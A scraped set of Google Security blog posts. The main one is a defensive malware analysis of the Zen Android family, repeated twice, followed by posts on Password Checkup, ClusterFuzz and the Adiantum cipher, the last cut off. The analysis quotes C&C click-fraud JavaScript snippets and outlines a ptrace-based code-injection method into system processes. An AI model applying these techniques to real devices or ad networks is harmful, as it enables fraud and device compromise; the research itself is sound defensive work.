ad traffic directly or displaying ads from other sources in a very large volume can provide direct profit to the app author from the advertisers.   We have seen two types of apps that use this custom-made SDK. The first are games of very low quality that mimic the experience of popular mobile games. While the counterfeit games claim to provide similar functionality to the popular apps, they are simply used to display ads through a custom advertisement SDK.   The second type of apps reveals an evolution in the author's tactics. Instead of implementing very basic gameplay, the authors pirated and repackaged the original game in their app and bundled with it their advertisement SDK. The only noticeable difference is the game has more ads, including ads on the very first screen.    In all cases, the ads are used to convince users to install other apps from different developer accounts, but written by the same group. Those apps use the same techniques to monetize their actions.     Click fraud apps  The authors' tactics evolved from advertisement spam to real PHA (Click Fraud). Click fraud PHAs simulate user clicks on ads instead of simply displaying ads and waiting for users to click them. This allows the PHA authors to monetize their apps more effectively than through regular advertising. This behavior negatively impacts advertisement networks and their clients because advertising budget is spent without acquiring real customers, and impacts user experience by consuming their data plan resources.   The click fraud PHA requests a URL to the advertising network directly instead of proxying it through an additional SDK. The command &amp; control server (C&amp;C server) returns the URL to click along with a very long list of additional parameters in JSON format. After rendering the ad on the screen, the app tries to identify the part of the advertisement website to click. If that part is found, the app loads Javascript snippets from the JSON parameters to click a button or other HTML element, simulating a real user click. Because a user interacting with an ad often leads to a higher chance of the user purchasing something, ad networks often \"pay per click\" to developers who host their ads. Therefore, by simulating fraudulent clicks, these developers are making money without requiring a user to click on an advertisement.    This example code shows a JSON reply returned by the C&amp;C server. It has been shortened for brevity.    {  \"data\": [{   \"id\": \"107\",   \"url\": \"&lt;ayud_url&gt;\",   \"click_type\": \"2\",   \"keywords_js\": [{    \"keyword\": \"&lt;a class=\\\"show_hide btnnext\\\"\",    \"js\": \"javascript:window:document.getElementsByClassName(\\\"show_hide btnnext\\\")[0].click();\",   {    \"keyword\": \"value=\\\"Subscribe\\\" id=\\\"sub-click\\\"\",    \"js\": \"javascript:window:document.getElementById(\\\"sub-click\\\").click();\"  Based on this JSON reply, the app looks for an HTML snippet that corresponds to the active element ( show_hide btnnext ) and, if found, the Javascript snippet tries to perform a  click()  method on it.     Rooting trojans  The Zen authors have also created a rooting trojan. Using a publicly available rooting framework, the PHA attempts to root devices and gain persistence on them by reinstalling itself on the system partition of rooted device. Installing apps on the system partition makes it harder for the user to remove the app.   This technique only works for unpatched devices running Android 4.3 or lower. Devices running Android 4.4 and higher are protected by  Verified Boot .   Zen's rooting trojan apps target a specific device model with a very specific system image. After achieving root access the app tries to replace the framework.jar file on the system partition. Replicating framework.jar allows the app to intercept and modify the behavior of the Android standard API. In particular, these apps try to add an additional method called  statistics()  into the Activity class. When inserted,  this method runs every time any Activity object in any Android app is created. This happens all the time in regular Android apps, as Activity is one of the fundamental Android UI elements. The only purpose of this method is to connect to the C&amp;C server.     The Zen trojan  After achieving persistence, the trojan downloads additional payloads, including another trojan called Zen. Zen requires root to work correctly on the Android operating system.   The Zen trojan uses its root privileges to turn on accessibility service (a service used to allow Android users with disabilities to use their devices) for itself by writing to a system-wide setting value  enabled_accessibility_services . Zen doesn't even check for the root privilege: it just assumes it has it. This leads us to believe that Zen is just part of a larger infection chain. The trojan implements three accessibility services directed at different Android API levels and uses these accessibility services, chosen by checking the operating system version, to create new Google accounts. This is done by opening the Google account creation process and parsing the current view. The app then clicks the appropriate buttons, scrollbars, and other UI elements to go through account sign-up without user intervention.   During the account sign-up process, Google may flag the account creation attempt as suspicious and prompt the app to solve a CAPTCHA. To get around this, the app then uses its root privilege to inject code into the Setup Wizard, extract the CAPTCHA image, and sends it to a remote server to try to solve the CAPTCHA. It is unclear if the remote server is capable of solving the CAPTCHA image automatically or if this is done manually by a human in the background. After the server returns the solution, the app enters it into the appropriate text field to complete the CAPTCHA challenge.    The Zen trojan does not implement any kind of obfuscation except for one string that is encoded using Base64 encoding. It's one of the strings - \"How you'll sign in\" - that it looks for during the account creation process. The code snippet below shows part of the screen parsing process.    if (!title.containsKey(\"Enter the code\")) {    if (!title.containsKey(\"Basic information\")) {      if (!title.containsKey(new String(android.util.Base64.decode(\"SG93IHlvdeKAmWxsIHNpZ24gaW4=\".getBytes(), 0)))) {        if (!title.containsKey(\"Create password\")) {          if (!title.containsKey(\"Add phone number\")) {        Apart from injecting code to read the CAPTCHA, the app also injects its own code into the  system_server  process, which requires root privileges. This indicates that the app tries to hide itself from any anti-PHA systems that look for a specific app process name or does not have the ability to scan the memory of the  system_server  process.   The app also creates hooks to prevent the phone from rebooting, going to sleep or allowing the user from pressing hardware buttons during the account creation process. These hooks are created using the root access and a custom native code called  Lmt_INJECT , although the algorithm for this is well known.   First, the app has to turn off  SELinux protection . Then the app finds a process id value for the process it wants to inject with code. This is done using a series of syscalls as outlined below. The \"source process\" refers to the Zen trojan running as root, while the \"target process\" refers to the process to which the code is injected and [pid] refers to the target process pid value.      The source process checks the mapping between a process id and a process name. This is done by reading the  /proc/[pid]/cmdline  file.  This very first step fails in Android 7.0 and higher, even with a root permission. The  /proc  filesystem is now mounted with a  hidepid=2  parameter, which means that the process cannot access other process  /proc/[pid] directory .    A  ptrace_attach  syscall is called.  This allows the source process to trace the target.    The source process looks at its own memory to calculate the offset between the beginning of the  libc  library and the  mmap  address.    The source process reads  /proc/[pid]/maps  to find where  libc  is located in the target process memory. By adding the previously calculated offset, it can get the address of the  mmap  function in the target process memory.    The source process tries to determine the location of  dlopen ,  dlsym , and  dlclose  functions in the target process. It uses the same technique as it used to determine the offset to the  mmap  function.    The source process writes the native shellcode into the memory region allocated by  mmap . Additionally, it also writes addresses of  dlopen ,  dlsym , and  dlclose  into the same region, so that they can be used by the shellcode. Shellcode simply uses  dlopen  to open a .so file within the target process and then  dlsym  to find a symbol in that file and run it.    The source process changes the registers in the target process so that PC register points directly to the shellcode. This is done using the  ptrace  syscall.    This diagram illustrates the whole process.           Summary  PHA authors go to great lengths to come up with increasingly clever ways to monetize their apps.   Zen family PHA authors exhibit a wide range of techniques, from simply inserting an advertising SDK to a sophisticated trojan. The app that resulted in the largest number of affected users was the click fraud version, which was installed over 170,000 times at its peak in February 2018. The most affected countries were India, Brazil, and Indonesia. In most cases, these click fraud apps were uninstalled by the users, probably due to the low quality of the apps.   If Google Play Protect detects one of these apps, Google Play Protect will show a warning to users.   We are constantly on the lookout for new threats and we are expanding our protections. Every device with Google Play includes Google Play Protect and all apps on Google Play are automatically and periodically scanned by our solutions.   You can check the status of Google Play Protect on your device:      Open your Android device's Google Play Store app.    Tap Menu&gt;Play Protect.    Look for information about the status of your device.            Hashes of samples                            Type            Package name            SHA256 digest                 Custom ads           com.targetshoot.zombieapocalypse.sniper.zombieshootinggame            5d98d8a7a012a858f0fa4cf8d2ed3d5a82937b1a98ea2703d440307c63c6c928                 Click fraud           com.counterterrorist.cs.elite.combat.shootinggame            84672fb2f228ec749d3c3c1cb168a1c31f544970fd29136bea2a5b2cefac6d04                 Rooting trojan           com.android.world.news            bd233c1f5c477b0cc15d7f84392dab3a7a598243efa3154304327ff4580ae213                 Zen trojan           com.lmt.register            eb12cd65589cbc6f9d3563576c304273cb6a78072b0c20a155a0951370476d8d                                                  table, th, td {    border: 1px solid black;       Posted by Lukasz Siewierski, Android Security & Privacy Team Google Play Protect detects Potentially Harmful Applications (PHAs) which Google Play Protect defines as any mobile app that poses a potential security risk to users or to user data—commonly referred to as \"malware.\" in a variety of ways, such as static analysis, dynamic analysis, and machine learning. While our systems are great at automatically detecting and protecting against PHAs, we believe the best security comes from the combination of automated scanning and skilled human review.  With this blog series we will be sharing our research analysis with the research and broader security community, starting with the PHA family, Zen. Zen uses root permissions on a device to automatically enable a service that creates fake Google accounts. These accounts are created by abusing accessibility services. Zen apps gain access to root permissions from a rooting trojan in its infection chain. In this blog post, we do not differentiate between the rooting component and the component that abuses root: we refer to them interchangeably as Zen. We also describe apps that we think are coming from the same author or a group of authors. All of the PHAs that are mentioned in this blog post were detected and removed by Google Play Protect.    Background Uncovering PHAs takes a lot of detective work and unraveling the mystery of how they're possibly connected to other apps takes even more. PHA authors usually try to hide their tracks, so attribution is difficult. Sometimes, we can attribute different apps to the same author based on a small, unique pieces of evidence that suggest similarity, such as a repetition of an exceptionally rare code snippet, asset, or a particular string in the debug logs. Every once in a while, authors leave behind a trace that allows us to attribute not only similar apps, but also multiple different PHA families to the same group or person.  However, the actual timeline of the creation of different variants is unclear. In April 2013, we saw the first sample, which made heavy use of dynamic code loading (i.e., fetching executable code from remote sources after the initial app is installed). Dynamic code loading makes it impossible to state what kind of PHA it was. This sample displayed ads from various sources. More recent variants blend rooting capabilities and click fraud. As rooting exploits on Android become less prevalent and lucrative, PHA authors adapt their abuse or monetization strategy to focus on tactics like click fraud.  This post doesn't follow the chronological evolution of Zen, but instead covers relevant samples from least to most complex.    Apps with a custom-made advertisement SDK The simplest PHA from the author's portfolio used a specially crafted advertisement SDK to create a proxy for all ads-related network traffic. By proxying all requests through a custom server, the real source of ads is opaque. This example shows one possible implementation of this technique.    This approach allows the authors to combine ads from third-party advertising networks with ads they created for their own apps. It may even allow them to sell ad space directly to application developers. The advertisement SDK also collects statistics about clicks and impressions to make it easier to track revenue. Selling the ad traffic directly or displaying ads from other sources in a very large volume can provide direct profit to the app author from the advertisers.  We have seen two types of apps that use this custom-made SDK. The first are games of very low quality that mimic the experience of popular mobile games. While the counterfeit games claim to provide similar functionality to the popular apps, they are simply used to display ads through a custom advertisement SDK.  The second type of apps reveals an evolution in the author's tactics. Instead of implementing very basic gameplay, the authors pirated and repackaged the original game in their app and bundled with it their advertisement SDK. The only noticeable difference is the game has more ads, including ads on the very first screen.   In all cases, the ads are used to convince users to install other apps from different developer accounts, but written by the same group. Those apps use the same techniques to monetize their actions.   Click fraud apps The authors' tactics evolved from advertisement spam to real PHA (Click Fraud). Click fraud PHAs simulate user clicks on ads instead of simply displaying ads and waiting for users to click them. This allows the PHA authors to monetize their apps more effectively than through regular advertising. This behavior negatively impacts advertisement networks and their clients because advertising budget is spent without acquiring real customers, and impacts user experience by consuming their data plan resources.  The click fraud PHA requests a URL to the advertising network directly instead of proxying it through an additional SDK. The command & control server (C&C server) returns the URL to click along with a very long list of additional parameters in JSON format. After rendering the ad on the screen, the app tries to identify the part of the advertisement website to click. If that part is found, the app loads Javascript snippets from the JSON parameters to click a button or other HTML element, simulating a real user click. Because a user interacting with an ad often leads to a higher chance of the user purchasing something, ad networks often \"pay per click\" to developers who host their ads. Therefore, by simulating fraudulent clicks, these developers are making money without requiring a user to click on an advertisement.   This example code shows a JSON reply returned by the C&C server. It has been shortened for brevity.  {  \"data\": [{   \"id\": \"107\",   \"url\": \" \",   \"click_type\": \"2\",   \"keywords_js\": [{    \"keyword\": \"<a class=\\\"show_hide btnnext\\\"\",    \"js\": \"javascript:window:document.getElementsByClassName(\\\"show_hide btnnext\\\")[0].click();\",   {    \"keyword\": \"value=\\\"Subscribe\\\" id=\\\"sub-click\\\"\",    \"js\": \"javascript:window:document.getElementById(\\\"sub-click\\\").click();\" Based on this JSON reply, the app looks for an HTML snippet that corresponds to the active element (show_hide btnnext) and, if found, the Javascript snippet tries to perform a click() method on it.   Rooting trojans The Zen authors have also created a rooting trojan. Using a publicly available rooting framework, the PHA attempts to root devices and gain persistence on them by reinstalling itself on the system partition of rooted device. Installing apps on the system partition makes it harder for the user to remove the app.  This technique only works for unpatched devices running Android 4.3 or lower. Devices running Android 4.4 and higher are protected by Verified Boot.  Zen's rooting trojan apps target a specific device model with a very specific system image. After achieving root access the app tries to replace the framework.jar file on the system partition. Replicating framework.jar allows the app to intercept and modify the behavior of the Android standard API. In particular, these apps try to add an additional method called statistics() into the Activity class. When inserted,  this method runs every time any Activity object in any Android app is created. This happens all the time in regular Android apps, as Activity is one of the fundamental Android UI elements. The only purpose of this method is to connect to the C&C server.   The Zen trojan After achieving persistence, the trojan downloads additional payloads, including another trojan called Zen. Zen requires root to work correctly on the Android operating system.  The Zen trojan uses its root privileges to turn on accessibility service (a service used to allow Android users with disabilities to use their devices) for itself by writing to a system-wide setting value enabled_accessibility_services. Zen doesn't even check for the root privilege: it just assumes it has it. This leads us to believe that Zen is just part of a larger infection chain. The trojan implements three accessibility services directed at different Android API levels and uses these accessibility services, chosen by checking the operating system version, to create new Google accounts. This is done by opening the Google account creation process and parsing the current view. The app then clicks the appropriate buttons, scrollbars, and other UI elements to go through account sign-up without user intervention.  During the account sign-up process, Google may flag the account creation attempt as suspicious and prompt the app to solve a CAPTCHA. To get around this, the app then uses its root privilege to inject code into the Setup Wizard, extract the CAPTCHA image, and sends it to a remote server to try to solve the CAPTCHA. It is unclear if the remote server is capable of solving the CAPTCHA image automatically or if this is done manually by a human in the background. After the server returns the solution, the app enters it into the appropriate text field to complete the CAPTCHA challenge.   The Zen trojan does not implement any kind of obfuscation except for one string that is encoded using Base64 encoding. It's one of the strings - \"How you'll sign in\" - that it looks for during the account creation process. The code snippet below shows part of the screen parsing process.  if (!title.containsKey(\"Enter the code\")) {    if (!title.containsKey(\"Basic information\")) {      if (!title.containsKey(new String(android.util.Base64.decode(\"SG93IHlvdeKAmWxsIHNpZ24gaW4=\".getBytes(), 0)))) {        if (!title.containsKey(\"Create password\")) {          if (!title.containsKey(\"Add phone number\")) {   Apart from injecting code to read the CAPTCHA, the app also injects its own code into the system_server process, which requires root privileges. This indicates that the app tries to hide itself from any anti-PHA systems that look for a specific app process name or does not have the ability to scan the memory of the system_server process.  The app also creates hooks to prevent the phone from rebooting, going to sleep or allowing the user from pressing hardware buttons during the account creation process. These hooks are created using the root access and a custom native code called Lmt_INJECT, although the algorithm for this is well known.  First, the app has to turn off SELinux protection. Then the app finds a process id value for the process it wants to inject with code. This is done using a series of syscalls as outlined below. The \"source process\" refers to the Zen trojan running as root, while the \"target process\" refers to the process to which the code is injected and [pid] refers to the target process pid value.   The source process checks the mapping between a process id and a process name. This is done by reading the /proc/[pid]/cmdline file. This very first step fails in Android 7.0 and higher, even with a root permission. The /proc filesystem is now mounted with a hidepid=2 parameter, which means that the process cannot access other process /proc/[pid] directory.  A ptrace_attach syscall is called.  This allows the source process to trace the target.  The source process looks at its own memory to calculate the offset between the beginning of the libc library and the mmap address.  The source process reads /proc/[pid]/maps to find where libc is located in the target process memory. By adding the previously calculated offset, it can get the address of the mmap function in the target process memory.  The source process tries to determine the location of dlopen, dlsym, and dlclose functions in the target process. It uses the same technique as it used to determine the offset to the mmap function.  The source process writes the native shellcode into the memory region allocated by mmap. Additionally, it also writes addresses of dlopen, dlsym, and dlclose into the same region, so that they can be used by the shellcode. Shellcode simply uses dlopen to open a .so file within the target process and then dlsym to find a symbol in that file and run it.  The source process changes the registers in the target process so that PC register points directly to the shellcode. This is done using the ptrace syscall.  This diagram illustrates the whole process.     Summary PHA authors go to great lengths to come up with increasingly clever ways to monetize their apps.  Zen family PHA authors exhibit a wide range of techniques, from simply inserting an advertising SDK to a sophisticated trojan. The app that resulted in the largest number of affected users was the click fraud version, which was installed over 170,000 times at its peak in February 2018. The most affected countries were India, Brazil, and Indonesia. In most cases, these click fraud apps were uninstalled by the users, probably due to the low quality of the apps.  If Google Play Protect detects one of these apps, Google Play Protect will show a warning to users.  We are constantly on the lookout for new threats and we are expanding our protections. Every device with Google Play includes Google Play Protect and all apps on Google Play are automatically and periodically scanned by our solutions.  You can check the status of Google Play Protect on your device:   Open your Android device's Google Play Store app.  Tap Menu>Play Protect.  Look for information about the status of your device.     Hashes of samples              Type        Package name        SHA256 digest            Custom ads        com.targetshoot.zombieapocalypse.sniper.zombieshootinggame        5d98d8a7a012a858f0fa4cf8d2ed3d5a82937b1a98ea2703d440307c63c6c928            Click fraud        com.counterterrorist.cs.elite.combat.shootinggame        84672fb2f228ec749d3c3c1cb168a1c31f544970fd29136bea2a5b2cefac6d04            Rooting trojan        com.android.world.news        bd233c1f5c477b0cc15d7f84392dab3a7a598243efa3154304327ff4580ae213            Zen trojan        com.lmt.register        eb12cd65589cbc6f9d3563576c304273cb6a78072b0c20a155a0951370476d8d             ", "date": "January 11, 2019"},
{"website": "Google-Security", "title": "\nProtect your accounts from data breaches with Password Checkup\n", "author": ["Posted by Jennifer Pullman, Kurt Thomas, and Elie Bursztein, Security and Anti-abuse research"], "link": "https://security.googleblog.com/2019/02/protect-your-accounts-from-data.html", "abstract": "                             Posted by Jennifer Pullman, Kurt Thomas, and Elie Bursztein, Security and Anti-abuse research      Update (Feb 6) : We have updated the post to clarify a protocol used in the design is centered around private set intersection.    Google helps keep your account safe from hijacking with a defense in depth strategy that spans  prevention, detection, and mitigation . As part of this, we regularly reset the passwords of Google accounts affected by  third-party data breaches  in the event of password reuse. This strategy has helped us protect over 110 million users in the last two years alone. Without these safety measures, users would be at  ten times the risk  of account hijacking.    We want to help you stay safe not just on Google, but elsewhere on the web as well. This is where the new  Password Checkup Chrome extension  can help. Whenever you sign in to a site, Password Checkup will trigger a warning if the username and password you use is one of over 4 billion credentials that Google knows to be unsafe.    Password Checkup was designed jointly with cryptography experts at Stanford University to ensure that Google never learns your username or password, and that any breach data stays safe from wider exposure. Since Password Checkup is an early experiment, we&#8217;re sharing the technical details behind our privacy preserving protocol to be transparent about how we keep your data secure.                           Key design principles       We designed Password Checkup with three key principles in mind:        Alerts are actionable, not informational:  We believe that an alert should provide concise and accurate security advice. For an unsafe account, that means resetting your password. While it&#8217;s possible for data breaches to expose other personal data such as a phone number or mailing address, there&#8217;s no straightforward next step to re-securing that data. That&#8217;s why we focus only on warning you about unsafe usernames and passwords.        Privacy is at the heart of our design:  Your usernames and passwords are incredibly sensitive. We designed Password Checkup with privacy-preserving technologies to never reveal this personal information to Google. We also designed Password Checkup to prevent an attacker from abusing Password Checkup to reveal unsafe usernames and passwords. Finally, all statistics reported by the extension are anonymous. These metrics include the number of lookups that surface an unsafe credential, whether an alert leads to a password change, and the web domain involved for improving site compatibility.        Advice that avoids fatigue : We designed Password Checkup to only alert you when all of the information necessary to access your account has fallen into the hands of an attacker. We won&#8217;t bother you about outdated passwords you&#8217;ve already reset or merely weak passwords like &#8220;123456&#8221;. We only generate an alert when both your current username and password appear in a breach, as that poses the greatest risk.       Settling on an approach            At a high level, Password Checkup needs to query Google about the breach status of a username and password without revealing the information queried. At the same time, we need to ensure that no information about other unsafe usernames or passwords leaks in the process, and that brute force guessing is not an option. Password Checkup addresses all of these requirements by using multiple rounds of hashing, k-anonymity, and private set intersection with blinding.         Our approach strikes a balance between privacy, computation overhead, and network latency. While  single-party private information retrieval (PIR)  and  1-out-of-N oblivious transfer  solve some of our requirements, the communication overhead involved for a database of over 4 billion records is presently intractable. Alternatively,  k-party PIR  and hardware enclaves present efficient alternatives, but they require user trust in schemes that are not widely deployed yet in practice. For k-party PIR, there is a risk of collusion; for enclaves, there is a risk of  hardware vulnerabilities  and side-channels.          A look under the hood            Here&#8217;s how Password Checkup works in practice to satisfy our security and privacy requirements.                                Protecting your accounts            Password Checkup is  currently available  as an extension for Chrome. Since this is a first version, we will continue refining it over the coming months, including improving site compatibility and username and password field detection.          Acknowledgements            This post reflects the work of a large group of Google engineers, research scientists, and others including: Niti Arora, Jacob Barrett, Borbala Benko, Alan Butler, Abhi Chaudhuri, Oxana Comanescu, Sunny Consolvo, Michael Dedrick, Kyler Emig, Mihaela Ion, Ilona Gaweda, Luca Invernizzi, Jozef Janovský, Yu Jiang, Patrick Gage Kelly, Nirdhar Khazanie, Guemmy Kim, Ben Kreuter, Valentina Lapteva, Maija Marincenko, Grzegorz Milka, Angelika Moscicki, Julia Nalven, Yuan Niu, Sarvar Patel, Tadek Pietraszek, Ganbayar Puntsagdash, Ananth Raghunathan, Juri Ranieri, Mark Risher, Masaru Sato, Karn Seth, Juho Snellman, Eduardo Tejada, Tu Tsao, Andy Wen, Kevin Yeo, Moti Yung, and Ali Zand.                                     Posted by Jennifer Pullman, Kurt Thomas, and Elie Bursztein, Security and Anti-abuse research  Update (Feb 6): We have updated the post to clarify a protocol used in the design is centered around private set intersection.  Google helps keep your account safe from hijacking with a defense in depth strategy that spans prevention, detection, and mitigation. As part of this, we regularly reset the passwords of Google accounts affected by third-party data breaches in the event of password reuse. This strategy has helped us protect over 110 million users in the last two years alone. Without these safety measures, users would be at ten times the risk of account hijacking.  We want to help you stay safe not just on Google, but elsewhere on the web as well. This is where the new Password Checkup Chrome extension can help. Whenever you sign in to a site, Password Checkup will trigger a warning if the username and password you use is one of over 4 billion credentials that Google knows to be unsafe.  Password Checkup was designed jointly with cryptography experts at Stanford University to ensure that Google never learns your username or password, and that any breach data stays safe from wider exposure. Since Password Checkup is an early experiment, we’re sharing the technical details behind our privacy preserving protocol to be transparent about how we keep your data secure.           Key design principles  We designed Password Checkup with three key principles in mind:   Alerts are actionable, not informational: We believe that an alert should provide concise and accurate security advice. For an unsafe account, that means resetting your password. While it’s possible for data breaches to expose other personal data such as a phone number or mailing address, there’s no straightforward next step to re-securing that data. That’s why we focus only on warning you about unsafe usernames and passwords.   Privacy is at the heart of our design: Your usernames and passwords are incredibly sensitive. We designed Password Checkup with privacy-preserving technologies to never reveal this personal information to Google. We also designed Password Checkup to prevent an attacker from abusing Password Checkup to reveal unsafe usernames and passwords. Finally, all statistics reported by the extension are anonymous. These metrics include the number of lookups that surface an unsafe credential, whether an alert leads to a password change, and the web domain involved for improving site compatibility.   Advice that avoids fatigue: We designed Password Checkup to only alert you when all of the information necessary to access your account has fallen into the hands of an attacker. We won’t bother you about outdated passwords you’ve already reset or merely weak passwords like “123456”. We only generate an alert when both your current username and password appear in a breach, as that poses the greatest risk.   Settling on an approach    At a high level, Password Checkup needs to query Google about the breach status of a username and password without revealing the information queried. At the same time, we need to ensure that no information about other unsafe usernames or passwords leaks in the process, and that brute force guessing is not an option. Password Checkup addresses all of these requirements by using multiple rounds of hashing, k-anonymity, and private set intersection with blinding.    Our approach strikes a balance between privacy, computation overhead, and network latency. While single-party private information retrieval (PIR) and 1-out-of-N oblivious transfer solve some of our requirements, the communication overhead involved for a database of over 4 billion records is presently intractable. Alternatively, k-party PIR and hardware enclaves present efficient alternatives, but they require user trust in schemes that are not widely deployed yet in practice. For k-party PIR, there is a risk of collusion; for enclaves, there is a risk of hardware vulnerabilities and side-channels.    A look under the hood    Here’s how Password Checkup works in practice to satisfy our security and privacy requirements.             Protecting your accounts    Password Checkup is currently available as an extension for Chrome. Since this is a first version, we will continue refining it over the coming months, including improving site compatibility and username and password field detection.    Acknowledgements    This post reflects the work of a large group of Google engineers, research scientists, and others including: Niti Arora, Jacob Barrett, Borbala Benko, Alan Butler, Abhi Chaudhuri, Oxana Comanescu, Sunny Consolvo, Michael Dedrick, Kyler Emig, Mihaela Ion, Ilona Gaweda, Luca Invernizzi, Jozef Janovský, Yu Jiang, Patrick Gage Kelly, Nirdhar Khazanie, Guemmy Kim, Ben Kreuter, Valentina Lapteva, Maija Marincenko, Grzegorz Milka, Angelika Moscicki, Julia Nalven, Yuan Niu, Sarvar Patel, Tadek Pietraszek, Ganbayar Puntsagdash, Ananth Raghunathan, Juri Ranieri, Mark Risher, Masaru Sato, Karn Seth, Juho Snellman, Eduardo Tejada, Tu Tsao, Andy Wen, Kevin Yeo, Moti Yung, and Ali Zand.     ", "date": "February 5, 2019"},
{"website": "Google-Security", "title": "\nOpen sourcing ClusterFuzz\n", "author": ["Posted by Abhishek Arya, Oliver Chang, Max Moroz, Martin Barbella and Jonathan Metzman (ClusterFuzz team)"], "link": "https://security.googleblog.com/2019/02/open-sourcing-clusterfuzz.html", "abstract": "                             Posted by Abhishek Arya, Oliver Chang, Max Moroz, Martin Barbella and Jonathan Metzman (ClusterFuzz team)      [Cross-posted from the  Google Open-Source Blog ]      Fuzzing  is an automated method for detecting bugs in software that works by feeding unexpected inputs to a target program. It is effective at finding  memory corruption bugs , which often have  serious   security   implications . Manually finding these issues is both difficult and time consuming, and bugs often slip through despite rigorous code review practices. For software projects written in an  unsafe  language such as C or C++, fuzzing is a crucial part of ensuring their security and stability.    In order for fuzzing to be truly effective, it must be continuous, done at scale, and integrated into the development process of a software project. To  provide these features  for Chrome, we wrote ClusterFuzz, a fuzzing infrastructure running on over 25,000 cores. Two years ago, we began offering ClusterFuzz as a free service to open source projects through  OSS-Fuzz .    Today, we&#8217;re announcing that  ClusterFuzz  is now open source and available for anyone to use.                 We developed ClusterFuzz over eight years to fit seamlessly into developer workflows, and to make it dead simple to find bugs and get them fixed. ClusterFuzz provides end-to-end automation, from bug detection, to triage (accurate deduplication,  bisection ), to bug reporting, and finally to automatic closure of bug reports.    ClusterFuzz has found more than  16,000  bugs in Chrome and more than  11,000  bugs in over  160  open source projects integrated with OSS-Fuzz. It is an integral part of the development process of Chrome and many other open source projects. ClusterFuzz is often able to detect  bugs  hours after they are introduced and verify the fix within a day.    Check out our  GitHub repository . You can try ClusterFuzz locally by following these  instructions . In  production , ClusterFuzz depends on some key  Google Cloud Platform  services, but you can use your own compute cluster. We welcome your contributions and look forward to any suggestions to help improve and extend this infrastructure. Through open sourcing ClusterFuzz, we hope to encourage all software developers to integrate fuzzing into their workflows.                                   Posted by Abhishek Arya, Oliver Chang, Max Moroz, Martin Barbella and Jonathan Metzman (ClusterFuzz team)  [Cross-posted from the Google Open-Source Blog]  Fuzzing is an automated method for detecting bugs in software that works by feeding unexpected inputs to a target program. It is effective at finding memory corruption bugs, which often have serious security implications. Manually finding these issues is both difficult and time consuming, and bugs often slip through despite rigorous code review practices. For software projects written in an unsafe language such as C or C++, fuzzing is a crucial part of ensuring their security and stability.  In order for fuzzing to be truly effective, it must be continuous, done at scale, and integrated into the development process of a software project. To provide these features for Chrome, we wrote ClusterFuzz, a fuzzing infrastructure running on over 25,000 cores. Two years ago, we began offering ClusterFuzz as a free service to open source projects through OSS-Fuzz.  Today, we’re announcing that ClusterFuzz is now open source and available for anyone to use.       We developed ClusterFuzz over eight years to fit seamlessly into developer workflows, and to make it dead simple to find bugs and get them fixed. ClusterFuzz provides end-to-end automation, from bug detection, to triage (accurate deduplication, bisection), to bug reporting, and finally to automatic closure of bug reports.  ClusterFuzz has found more than 16,000 bugs in Chrome and more than 11,000 bugs in over 160 open source projects integrated with OSS-Fuzz. It is an integral part of the development process of Chrome and many other open source projects. ClusterFuzz is often able to detect bugs hours after they are introduced and verify the fix within a day.  Check out our GitHub repository. You can try ClusterFuzz locally by following these instructions. In production, ClusterFuzz depends on some key Google Cloud Platform services, but you can use your own compute cluster. We welcome your contributions and look forward to any suggestions to help improve and extend this infrastructure. Through open sourcing ClusterFuzz, we hope to encourage all software developers to integrate fuzzing into their workflows.     ", "date": "February 7, 2019"},
{"website": "Google-Security", "title": "\n Introducing Adiantum: Encryption for the Next Billion Users\n", "author": ["Posted by Paul Crowley and Eric Biggers, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2019/02/introducing-adiantum-encryption-for.html", "abstract": "                             Posted by Paul Crowley and Eric Biggers, Android Security &amp; Privacy Team                 Storage encryption protects your data if your phone falls into someone else's hands. Adiantum is an innovation in cryptography designed to make storage encryption more efficient for devices without cryptographic acceleration, to ensure that  all  devices can be encrypted.   Today, Android offers storage encryption using the Advanced Encryption Standard (AES). Most new Android devices have hardware support for AES via the ARMv8 Cryptography Extensions. However, Android runs on a wide range of devices. This includes not just the latest flagship and mid-range phones, but also entry-level  Android Go  phones sold primarily in developing countries, along with  smart watches  and  TVs . In order to offer low cost options, device manufacturers sometimes use low-end processors such as the ARM Cortex-A7, which does not have hardware support for AES. On these devices, AES is so slow that it would result in a poor user experience; apps would take much longer to launch, and the device would generally feel much slower. So while storage encryption has been  required  for most devices since Android 6.0 in 2015, devices with poor AES performance (50 MiB/s and below) are exempt. We've been working to change this because we believe that encryption is for everyone.   In HTTPS encryption, this is a solved problem. The  ChaCha20 stream cipher  is much faster than AES when hardware acceleration is unavailable, while also being extremely secure. It is fast because it exclusively relies on operations that all CPUs natively support: additions, rotations, and XORs. For this reason,  in 2014 Google selected ChaCha20  along with the  Poly1305 authenticator , which is also fast in software, for a new TLS cipher suite to secure HTTPS internet connections. ChaCha20-Poly1305 has been standardized as  RFC7539 , and it greatly improves HTTPS performance on devices that lack AES instructions.   However, disk and file encryption present a special challenge. Data on storage devices is organized into \"sectors\" which today are typically 4096 bytes. When the filesystem makes a request to the device to read or write a sector, the encryption layer intercepts that request and converts between plaintext and ciphertext. This means that we must convert between a 4096-byte plaintext and a 4096-byte ciphertext. But to use RFC7539, the ciphertext must be slightly larger than the plaintext; a little space is needed for the cryptographic  nonce  and  message integrity  information. There are software techniques for finding places to store this extra information, but they reduce efficiency and can impose significant complexity on filesystem design.   Where AES is used, the conventional solution for disk encryption is to use the XTS or CBC-ESSIV modes of operation, which are length-preserving. Currently Android supports AES-128-CBC-ESSIV for full-disk encryption and AES-256-XTS for file-based encryption. However, when AES performance is insufficient there is no widely accepted alternative that has sufficient performance on lower-end ARM processors.   To solve this problem, we have designed a new encryption mode called  Adiantum . Adiantum allows us to use the ChaCha stream cipher in a length-preserving mode, by adapting ideas from AES-based proposals for length-preserving encryption such as  HCTR  and  HCH . On ARM Cortex-A7, Adiantum encryption and decryption on 4096-byte sectors is about 10.6 cycles per byte, around 5x faster than AES-256-XTS.           Unlike modes such as XTS or CBC-ESSIV, Adiantum is a true wide-block mode: changing any bit anywhere in the plaintext will unrecognizably change all of the ciphertext, and vice versa. It works by first hashing almost the entire plaintext using a keyed hash based on Poly1305 and another very fast keyed hashing function called NH. We also hash a value called the \"tweak\" which is used to ensure that different sectors are encrypted differently. This hash is then used to generate a nonce for the ChaCha encryption. After encryption, we hash again, so that we have the same strength in the decryption direction as the encryption direction. This is arranged in a configuration known as a Feistel network, so that we can decrypt what we've encrypted. A single AES-256 invocation on a 16-byte block is also required, but for 4096-byte inputs this part is not performance-critical.           Cryptographic primitives like ChaCha are organized in \"rounds\", with each round increasing our confidence in security at a cost in speed. To make disk encryption fast enough on the widest range of 